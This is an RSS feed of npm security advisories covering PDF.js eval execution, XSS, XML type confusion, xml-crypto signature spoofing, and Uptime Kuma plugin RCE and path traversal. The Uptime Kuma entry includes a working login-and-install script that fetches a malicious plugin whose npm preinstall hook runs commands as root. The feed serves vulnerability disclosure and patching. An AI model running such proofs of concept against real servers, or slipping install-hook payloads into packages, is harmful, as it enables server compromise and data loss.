<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-05-07T11:01:12.534Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[pdfjs-dist] PDF.js vulnerable to arbitrary JavaScript execution upon opening a malicious PDF]]></title>
        <id>https://github.com/advisories/GHSA-wgrm-67xf-hhpq</id>
        <link href="https://github.com/advisories/GHSA-wgrm-67xf-hhpq"/>
        <updated>2024-05-07T10:26:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If pdf.js is used to load a malicious PDF, and PDF.js is configured with <code>isEvalSupported</code> set to <code>true</code> (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.</p>
<h3 id="patches">Patches</h3>
<p>The patch removes the use of <code>eval</code>:
<a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Set the option <code>isEvalSupported</code> to <code>false</code>. </p>
<h3 id="references">References</h3>
<p><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1893645">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq">https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
<li><a href="https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1893645">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></li>
<li><a href="https://github.com/advisories/GHSA-wgrm-67xf-hhpq">https://github.com/advisories/GHSA-wgrm-67xf-hhpq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgrm-67xf-hhpq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-07T10:25:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vditor] Vditor allows Cross-site Scripting via an attribute of an `A` element]]></title>
        <id>https://github.com/advisories/GHSA-m5jf-8crm-r65m</id>
        <link href="https://github.com/advisories/GHSA-m5jf-8crm-r65m"/>
        <updated>2024-05-03T20:38:16.000Z</updated>
        <content type="html"><![CDATA[<p>Vditor 3.10.3 allows XSS via an attribute of an <code>A</code> element.</p>
<p>NOTE: the vendor indicates that a user is supposed to mitigate this via <code>sanitize=true</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34449">https://nvd.nist.gov/vuln/detail/CVE-2024-34449</a></li>
<li><a href="https://github.com/Vanessa219/vditor/issues/1604">https://github.com/Vanessa219/vditor/issues/1604</a></li>
<li><a href="https://github.com/Vanessa219/vditor/blob/b3a14d6e4462b0c17141e1fcc66173264ada64e0/README_en_US.md?plain=1#L310">https://github.com/Vanessa219/vditor/blob/b3a14d6e4462b0c17141e1fcc66173264ada64e0/README_en_US.md?plain=1#L310</a></li>
<li><a href="https://github.com/advisories/GHSA-m5jf-8crm-r65m">https://github.com/advisories/GHSA-m5jf-8crm-r65m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5jf-8crm-r65m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-03T18:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kurwov] kurwov vulnerable to Denial of Service due to improper data sanitization]]></title>
        <id>https://github.com/advisories/GHSA-hfrv-h3q8-9jpr</id>
        <link href="https://github.com/advisories/GHSA-hfrv-h3q8-9jpr"/>
        <updated>2024-05-03T20:30:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsafe sanitization of dataset contents on the <code>MarkovData#getNext</code> method used in <code>Markov#generate</code> and <code>Markov#choose</code> allows a maliciously crafted string on the dataset to throw and stop the function from running properly.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44">https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44</a></p>
<p>If a string contains a forbidden substring (i.e. <code>__proto__</code>) followed by a space character, the second line will access a special property in <code>MarkovData#finalData</code> by removing the last character of the string, bypassing the dataset sanitization (as it is supposed to be already sanitized before this function is called).</p>
<p><code>data</code> is then defined as the special function found in its prototype instead of an array.</p>
<p>On the last line, <code>data</code> is then indexed by a random number, which is supposed to return a string but returns undefined as it's a function. Calling <code>endsWith</code> then throws.</p>
<h3 id="poc">PoC</h3>
<p><a href="https://runkit.com/embed/m6uu40r5ja9b">https://runkit.com/embed/m6uu40r5ja9b</a></p>
<h3 id="impact">Impact</h3>
<p>Any dataset can be contaminated with the substring making it unable to properly generate anything in some cases.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/xiboon/kurwov/security/advisories/GHSA-hfrv-h3q8-9jpr">https://github.com/xiboon/kurwov/security/advisories/GHSA-hfrv-h3q8-9jpr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34075">https://nvd.nist.gov/vuln/detail/CVE-2024-34075</a></li>
<li><a href="https://github.com/xiboon/kurwov/commit/85d63e652594f121d6656177d7a3c0d823c976c9">https://github.com/xiboon/kurwov/commit/85d63e652594f121d6656177d7a3c0d823c976c9</a></li>
<li><a href="https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44">https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44</a></li>
<li><a href="https://github.com/advisories/GHSA-hfrv-h3q8-9jpr">https://github.com/advisories/GHSA-hfrv-h3q8-9jpr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfrv-h3q8-9jpr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-03T20:30:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libxmljs] libxmljs vulnerable to type confusion when parsing specially crafted XML]]></title>
        <id>https://github.com/advisories/GHSA-6433-x5p4-8jc7</id>
        <link href="https://github.com/advisories/GHSA-6433-x5p4-8jc7"/>
        <updated>2024-05-03T20:24:30.000Z</updated>
        <content type="html"><![CDATA[<p>libxmljs is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking a function on the result of <code>attrs()</code> that was called on a parsed node. This vulnerability might lead to denial of service (on both 32-bit systems and 64-bit systems), data leak, infinite loop and remote code execution (on 32-bit systems with the XML_PARSE_HUGE flag enabled).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34391">https://nvd.nist.gov/vuln/detail/CVE-2024-34391</a></li>
<li><a href="https://github.com/libxmljs/libxmljs/issues/645">https://github.com/libxmljs/libxmljs/issues/645</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/libxmljs-attrs-type-confusion-rce-jfsa-2024-001033988">https://research.jfrog.com/vulnerabilities/libxmljs-attrs-type-confusion-rce-jfsa-2024-001033988</a></li>
<li><a href="https://github.com/advisories/GHSA-6433-x5p4-8jc7">https://github.com/advisories/GHSA-6433-x5p4-8jc7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6433-x5p4-8jc7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-02T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libxmljs2] libxmljs vulnerable to type confusion when parsing specially crafted XML]]></title>
        <id>https://github.com/advisories/GHSA-78h3-pg4x-j8cv</id>
        <link href="https://github.com/advisories/GHSA-78h3-pg4x-j8cv"/>
        <updated>2024-05-03T20:24:18.000Z</updated>
        <content type="html"><![CDATA[<p>libxmljs2 is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking the <code>namespaces()</code> function (which invokes <code>XmlNode::get_local_namespaces()</code>) on a grand-child of a node that refers to an entity. This vulnerability can lead to denial of service and remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34394">https://nvd.nist.gov/vuln/detail/CVE-2024-34394</a></li>
<li><a href="https://github.com/marudor/libxmljs2/issues/205">https://github.com/marudor/libxmljs2/issues/205</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/libxmljs2-namespaces-type-confusion-rce-jfsa-2024-001034098">https://research.jfrog.com/vulnerabilities/libxmljs2-namespaces-type-confusion-rce-jfsa-2024-001034098</a></li>
<li><a href="https://github.com/advisories/GHSA-78h3-pg4x-j8cv">https://github.com/advisories/GHSA-78h3-pg4x-j8cv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78h3-pg4x-j8cv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-02T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libxmljs] libxmljs vulnerable to type confusion when parsing specially crafted XML ]]></title>
        <id>https://github.com/advisories/GHSA-mg49-jqgw-gcj6</id>
        <link href="https://github.com/advisories/GHSA-mg49-jqgw-gcj6"/>
        <updated>2024-05-03T20:24:05.000Z</updated>
        <content type="html"><![CDATA[<p>libxmljs is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking the <code>namespaces()</code> function (which invokes <code>_wrap__xmlNode_nsDef_get()</code>) on a grand-child of a node that refers to an entity. This vulnerability can lead to denial of service and remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34392">https://nvd.nist.gov/vuln/detail/CVE-2024-34392</a></li>
<li><a href="https://github.com/libxmljs/libxmljs/issues/646">https://github.com/libxmljs/libxmljs/issues/646</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/libxmljs-namespaces-type-confusion-rce-jfsa-2024-001034096">https://research.jfrog.com/vulnerabilities/libxmljs-namespaces-type-confusion-rce-jfsa-2024-001034096</a></li>
<li><a href="https://github.com/advisories/GHSA-mg49-jqgw-gcj6">https://github.com/advisories/GHSA-mg49-jqgw-gcj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg49-jqgw-gcj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-02T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[firebase-tools] Firebase vulnerable to CRSF attack]]></title>
        <id>https://github.com/advisories/GHSA-rcm2-22f3-pqv3</id>
        <link href="https://github.com/advisories/GHSA-rcm2-22f3-pqv3"/>
        <updated>2024-05-03T20:01:45.000Z</updated>
        <content type="html"><![CDATA[<p>This vulnerability was a potential CSRF attack.&nbsp;When running the Firebase emulator suite, there is an export endpoint that is used normally to export data from running emulators. If a user was running the emulator and navigated to a malicious website with the exploit on a browser that allowed calls to localhost (ie Chrome before v94), the website could exfiltrate emulator data. We recommend upgrading past version 13.6.0 or <a href="https://github.com/firebase/firebase-tools/commit/068a2b08dc308c7ab4b569617f5fc8821237e3a0">commit&nbsp;068a2b08dc308c7ab4b569617f5fc8821237e3a0</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4128">https://nvd.nist.gov/vuln/detail/CVE-2024-4128</a></li>
<li><a href="https://github.com/firebase/firebase-tools/pull/6944">https://github.com/firebase/firebase-tools/pull/6944</a></li>
<li><a href="https://github.com/firebase/firebase-tools/commit/068a2b08dc308c7ab4b569617f5fc8821237e3a0">https://github.com/firebase/firebase-tools/commit/068a2b08dc308c7ab4b569617f5fc8821237e3a0</a></li>
<li><a href="https://github.com/advisories/GHSA-rcm2-22f3-pqv3">https://github.com/advisories/GHSA-rcm2-22f3-pqv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcm2-22f3-pqv3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-05-02T15:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libxmljs2] libxmljs2 type confusion vulnerability when parsing specially crafted XML]]></title>
        <id>https://github.com/advisories/GHSA-mjr4-7xg5-pfvh</id>
        <link href="https://github.com/advisories/GHSA-mjr4-7xg5-pfvh"/>
        <updated>2024-05-03T17:33:01.000Z</updated>
        <content type="html"><![CDATA[<p>libxmljs2 is vulnerable to type confusion when parsing a specially crafted XML while invoking a function on the result of attrs() that was called on a parsed node. This vulnerability might lead to denial of service (on both 32-bit systems and 64-bit systems), data leak, infinite loop and remote code execution (on 32-bit systems with the XML_PARSE_HUGE flag enabled). At the time of publication, there is no fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34393">https://nvd.nist.gov/vuln/detail/CVE-2024-34393</a></li>
<li><a href="https://github.com/marudor/libxmljs2/issues/204">https://github.com/marudor/libxmljs2/issues/204</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/libxmljs2-attrs-type-confusion-rce-jfsa-2024-001034097">https://research.jfrog.com/vulnerabilities/libxmljs2-attrs-type-confusion-rce-jfsa-2024-001034097</a></li>
<li><a href="https://github.com/advisories/GHSA-mjr4-7xg5-pfvh">https://github.com/advisories/GHSA-mjr4-7xg5-pfvh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mjr4-7xg5-pfvh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-02T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[s3-url-parser] s3-url-parser vulnerable to Denial of Service via regexes component]]></title>
        <id>https://github.com/advisories/GHSA-r4q9-xx5g-j24p</id>
        <link href="https://github.com/advisories/GHSA-r4q9-xx5g-j24p"/>
        <updated>2024-05-03T17:32:01.000Z</updated>
        <content type="html"><![CDATA[<p>s3-url-parser 1.0.3 is vulnerable to denial of service via the regexes component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25355">https://nvd.nist.gov/vuln/detail/CVE-2024-25355</a></li>
<li><a href="https://gist.github.com/6en6ar/a4977866c59cbcfc716f0f2717b812bf">https://gist.github.com/6en6ar/a4977866c59cbcfc716f0f2717b812bf</a></li>
<li><a href="https://github.com/AntonioRecaldeRusso/s3-url-parser/blob/master/index.js">https://github.com/AntonioRecaldeRusso/s3-url-parser/blob/master/index.js</a></li>
<li><a href="https://github.com/advisories/GHSA-r4q9-xx5g-j24p">https://github.com/advisories/GHSA-r4q9-xx5g-j24p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r4q9-xx5g-j24p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-01T21:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[xml-crypto] xml-crypto vulnerable to XML signature verification bypass due improper verification of signature/signature spoofing]]></title>
        <id>https://github.com/advisories/GHSA-2xp3-57p7-qf4v</id>
        <link href="https://github.com/advisories/GHSA-2xp3-57p7-qf4v"/>
        <updated>2024-05-02T19:35:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Default configuration does not check authorization of the signer, it only checks the validity of the signature per section 3.2.2 of <a href="https://www.w3.org/TR/2008/REC-xmldsig-core-20080610/#sec-CoreValidation">https://www.w3.org/TR/2008/REC-xmldsig-core-20080610/#sec-CoreValidation</a>. As such, without additional validation steps, the default configuration allows a malicious actor to re-sign an XML document, place the certificate in a <code>&lt;KeyInfo /&gt;</code> element, and pass <code>xml-crypto</code> default validation checks.</p>
<h3 id="details">Details</h3>
<p>Affected <code>xml-crypto</code> versions between versions <code>&gt;= 4.0.0</code> and <code>&lt; 6.0.0</code>. </p>
<p><code>xml-crypto</code> trusts by default any certificate provided via digitally signed XML document's <code>&lt;KeyInfo /&gt;</code>.</p>
<p><code>xml-crypto</code> prefers to use any certificate provided via digitally signed XML document's <code>&lt;KeyInfo /&gt;</code> even if library was configured to use specific certificate (<code>publicCert</code>) for signature verification purposes.</p>
<p>Attacker can spoof signature verification by modifying XML document and replacing existing signature with signature generated with malicious private key (created by attacker) and by attaching that private key's certificate to <code>&lt;KeyInfo /&gt;</code> element.</p>
<p>Vulnerability is combination of changes introduced to <code>4.0.0</code> at</p>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/pull/301">https://github.com/node-saml/xml-crypto/pull/301</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/commit/c2b83f984049edb68ad1d7c6ad0739ec92af11ca">https://github.com/node-saml/xml-crypto/commit/c2b83f984049edb68ad1d7c6ad0739ec92af11ca</a></li>
</ul>
<p>Changes at PR provided default method to extract certificate from signed XML document.</p>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L405-L414">https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L405-L414</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L334">https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L334</a></li>
</ul>
<p>and changes at PR prefer output of that method to be used as certificate for signature verification even in the case when library is configured to use specific/pre-configured <code>signingCert</code></p>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L507">https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L507</a></li>
</ul>
<p>Name of the <code>signingCert</code> was changed later (but prior to <code>4.0.0</code> release) to <code>publicCert</code>:</p>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/commit/78329fbae34c9b25ba25882604e960f506d7c0e7">https://github.com/node-saml/xml-crypto/commit/78329fbae34c9b25ba25882604e960f506d7c0e7</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/blob/78329fbae34c9b25ba25882604e960f506d7c0e7/lib/signed-xml.js#L507">https://github.com/node-saml/xml-crypto/blob/78329fbae34c9b25ba25882604e960f506d7c0e7/lib/signed-xml.js#L507</a></li>
</ul>
<p>Issue was fixed to <code>6.0.0</code> by disabling implicit usage of default <code>getCertFromKeyInfo</code> implementation:</p>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/pull/445">https://github.com/node-saml/xml-crypto/pull/445</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/commit/21201723d2ca9bc11288f62cf72552b7d659b000">https://github.com/node-saml/xml-crypto/commit/21201723d2ca9bc11288f62cf72552b7d659b000</a></li>
</ul>
<p>Possible workarounds for versions 4.x and 5.x:</p>
<ul>
<li>Check the certificate extracted via <code>getCertFromKeyInfo</code> against trusted certificates before accepting the results of the validation.</li>
<li>Set <code>xml-crypto</code>'s <code>getCertFromKeyInfo</code> to <code>() =&gt; undefined</code> forcing <code>xml-crypto</code> to use an explicitly configured <code>publicCert</code> or <code>privateKey</code> for signature verification.</li>
</ul>
<h3 id="poc">PoC</h3>
<p><a href="https://github.com/node-saml/xml-crypto/discussions/399">https://github.com/node-saml/xml-crypto/discussions/399</a></p>
<h3 id="impact">Impact</h3>
<p>An untrusted certificate can be used to pass a malicious XML payload through an improperly configured installation of <code>xml-crypto</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/security/advisories/GHSA-2xp3-57p7-qf4v">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-2xp3-57p7-qf4v</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/pull/301">https://github.com/node-saml/xml-crypto/pull/301</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/pull/445">https://github.com/node-saml/xml-crypto/pull/445</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/commit/21201723d2ca9bc11288f62cf72552b7d659b000">https://github.com/node-saml/xml-crypto/commit/21201723d2ca9bc11288f62cf72552b7d659b000</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/commit/c2b83f984049edb68ad1d7c6ad0739ec92af11ca">https://github.com/node-saml/xml-crypto/commit/c2b83f984049edb68ad1d7c6ad0739ec92af11ca</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/discussions/399">https://github.com/node-saml/xml-crypto/discussions/399</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32962">https://nvd.nist.gov/vuln/detail/CVE-2024-32962</a></li>
<li><a href="https://www.w3.org/TR/2008/REC-xmldsig-core-20080610/#sec-CoreValidation">https://www.w3.org/TR/2008/REC-xmldsig-core-20080610/#sec-CoreValidation</a></li>
<li><a href="https://github.com/advisories/GHSA-2xp3-57p7-qf4v">https://github.com/advisories/GHSA-2xp3-57p7-qf4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2xp3-57p7-qf4v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-01T17:05:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] Uptime Kuma vulnerable to authenticated remote code execution via malicious plugin installation]]></title>
        <id>https://github.com/advisories/GHSA-7grx-f945-mj96</id>
        <link href="https://github.com/advisories/GHSA-7grx-f945-mj96"/>
        <updated>2024-05-01T10:01:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Installation of a maliciously crafted plugin allows for remote code execution by an authenticated attacker.</p>
<h3 id="details">Details</h3>
<p>Uptime Kuma allows authenticated users to install plugins from an official list of plugins. This feature is currently disabled in the web interface, but the corresponding API endpoints are still available after login.
After downloading a plugin, it's installed by calling <code>npm install</code> in the installation directory of the plugin:
<a href="https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216">https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216</a></p>
<p>Because the plugin is not validated against the official list of plugins or installed with <code>npm install --ignore-scripts</code>, a maliciously crafted plugin taking advantage of <a href="https://docs.npmjs.com/cli/v9/using-npm/scripts">npm scripts</a> can gain remote code execution.</p>
<h3 id="poc">PoC</h3>
<p>In the PoC below, the plugin at <a href="https://github.com/n-thumann/npm-install-script-poc">https://github.com/n-thumann/npm-install-script-poc</a> will be installed. It only consists of an empty <code>index.js</code> and a <code>package.json</code> containing the script: <code>"preinstall": "echo \"Malicious code could have been executed as user $(whoami)\" &gt; /tmp/poc"</code>. This will be executed when installing the plugin.</p>
<ol>
<li>Start Uptime Kuma: <code>docker run -d -p 3001:3001 -v uptime-kuma:/app/data --name uptime-kuma louislam/uptime-kuma:1</code></li>
<li>Create a user using the Uptime Kuma web interface, e.g. user <code>admin</code> with password <code>admin123</code></li>
<li>Confirm that the PoC file to be created doesn't exist yet:</li>
</ol>
<pre><code>➜  ~ docker exec -it uptime-kuma cat /tmp/poc
cat: /tmp/poc: No such file or directory
</code></pre>
<ol start="4">
<li>Create file <code>poc.js</code> with the following content:</li>
</ol>
<pre><code>SERVER = "ws://localhost:3001";
USERNAME = "admin";
PASSWORD = "admin123";


const { io } = require("socket.io-client");
const socket = io(SERVER);
const repo = "https://github.com/n-thumann/npm-install-script-poc";
const name = "npm-install-script-poc";

socket.emit(
  "login",
  { username: USERNAME, password: PASSWORD, token: "" },
  (res) =&gt; {
    if (res.ok !== true) return console.log("Login failed");

    console.log("Login successful");
    socket.emit("installPlugin", repo, name, () =&gt; {
      console.log("Done");
      socket.close();
    });
  }
);
</code></pre>
<ol start="5">
<li>Install <code>socket.io-client</code>: <code>npm install socket.io-client</code></li>
<li>Run the script: <code>node poc.js</code>:</li>
</ol>
<pre><code># node poc.js
Login successful
Done
</code></pre>
<ol start="7">
<li>The PoC file has been created:</li>
</ol>
<pre><code>➜  ~ docker exec -it uptime-kuma cat /tmp/poc
Malicious code could have been executed as user root
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows authenticated attacker to gain remote code execution on the server Uptime Kuma is running on.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-7grx-f945-mj96">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-7grx-f945-mj96</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36821">https://nvd.nist.gov/vuln/detail/CVE-2023-36821</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/pull/3346">https://github.com/louislam/uptime-kuma/pull/3346</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/commit/a0736e04b2838aae198c2110db244eab6f87757b">https://github.com/louislam/uptime-kuma/commit/a0736e04b2838aae198c2110db244eab6f87757b</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216">https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/releases/tag/1.22.1">https://github.com/louislam/uptime-kuma/releases/tag/1.22.1</a></li>
<li><a href="https://github.com/advisories/GHSA-7grx-f945-mj96">https://github.com/advisories/GHSA-7grx-f945-mj96</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7grx-f945-mj96</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-01T10:01:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] Uptime Kuma's authenticated path traversal via plugin repository name may lead to unavailability or data loss]]></title>
        <id>https://github.com/advisories/GHSA-vr8x-74pm-6vj7</id>
        <link href="https://github.com/advisories/GHSA-vr8x-74pm-6vj7"/>
        <updated>2024-05-01T10:01:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A path traversal vulnerability via the plugin repository name allows an authenticated attacker to delete files on the server leading to unavailability and potentially data loss.</p>
<h3 id="details">Details</h3>
<p>Uptime Kuma allows authenticated users to install plugins from an official list of plugins. This feature is currently disabled in the web interface, but the corresponding API endpoints are still available after login.
Before a plugin is downloaded, the plugin installation directory is checked for existence. If it exists, it's removed before the plugin installation.</p>
<p>Because the plugin is not validated against the official list of plugins or sanitized, the check for existence and the removal of the plugin installation directory are prone to path traversal.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows an authenticated attacker to delete files from the server Uptime Kuma is running on.
Depending on which files are deleted, Uptime Kuma or the whole system may become unavailable due to data loss.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-vr8x-74pm-6vj7">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-vr8x-74pm-6vj7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36822">https://nvd.nist.gov/vuln/detail/CVE-2023-36822</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/pull/3346">https://github.com/louislam/uptime-kuma/pull/3346</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/commit/a0736e04b2838aae198c2110db244eab6f87757b">https://github.com/louislam/uptime-kuma/commit/a0736e04b2838aae198c2110db244eab6f87757b</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/blob/de74efb2e6601dcbcfed32cddefc4078a80fcb0b/server/plugins-manager.js#L75-L80">https://github.com/louislam/uptime-kuma/blob/de74efb2e6601dcbcfed32cddefc4078a80fcb0b/server/plugins-manager.js#L75-L80</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/releases/tag/1.22.1">https://github.com/louislam/uptime-kuma/releases/tag/1.22.1</a></li>
<li><a href="https://github.com/advisories/GHSA-vr8x-74pm-6vj7">https://github.com/advisories/GHSA-vr8x-74pm-6vj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vr8x-74pm-6vj7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
